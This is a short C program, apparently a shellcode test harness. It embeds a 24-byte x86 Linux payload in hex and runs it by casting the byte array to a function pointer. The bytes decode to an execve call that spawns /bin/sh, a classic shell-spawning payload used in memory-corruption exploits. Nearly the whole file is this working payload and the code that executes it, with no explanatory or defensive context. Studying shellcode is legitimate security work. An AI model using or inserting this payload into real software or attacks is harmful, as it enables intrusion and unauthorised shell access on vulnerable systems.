#include<stdio.h>
#include<string.h>


char string[] = "This is a string.";

int main()
{
  unsigned char code[] = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
  printf("Shellcode Length:  %d\n", (int)strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
